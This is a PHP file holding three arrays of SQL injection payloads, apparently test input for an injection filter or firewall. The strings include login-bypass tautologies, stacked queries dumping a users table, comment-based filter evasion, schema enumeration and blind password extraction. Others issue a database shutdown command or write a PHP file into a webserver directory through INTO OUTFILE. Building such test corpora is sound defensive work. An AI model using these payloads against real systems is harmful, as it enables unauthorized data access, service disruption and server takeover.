<?php

$sqlInjection1 = [
	"'--",
	"' OR 1 = 1 '",
	"' OR 1 = 1 --",
	"' OR 1 = 1 OR 1 = '",
	"' OR 1 = 1 OR 'test' LIKE('%",
	"'",
	"1 ' OR ' 1 ' = ' 1",
	"%') OR ' 1 ' = ' 1",
	"%') OR 'test' LIKE('%",
	")' OR 'test' = 'test' --",
	"aa'=('aa')#(",
	"abc' = !!!!!!!!!!!!!!'0",
	";if 1=1 shutdown-- -a",
	"'+COALESCE('admin') and @@version = !1 div 1+'",
	"foo'div count(select`pass`from(users)where mid(pass,1,1)rlike lower(conv(10,pi()*pi(),pi()*pi())) )-'0",
	"str#\' UNION SELECT group_concat(table_name)
                        FROM`information_schema`.tables",
    "1-#canvas
                        (SELECT 1*1 from(information_schema.tables) group by table_name having - left(hex(table_name),true) = -7)",
    "aa'=+'1"
	];

$sqlInjection2 = [
	"S/**/E/**/l/**//**/ECT * FROM users;--",
	"'; SELECT * FROM users; --",
	"'; SELECT * F/**/R/**//**/oM users;--",
	"'; SELECT /**/ * /**/ FROM users;--",
	"';SELECT/**/ * /**/FROM/**/users;--"
	];

$sqlInjection3 = [
	"' OR EXISTS(SELECT * FROM users WHERE name LIKE('test') AND password LIKE '%') AND ''='",
	"' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '%')>1 AND ''='",
	"MERGE INTO bonuses B USING (",
	"MERGE INTO bonuses B USING (SELECT",
	'1" INTO OUTFILE "C:/webserver/www/readme.php'
	];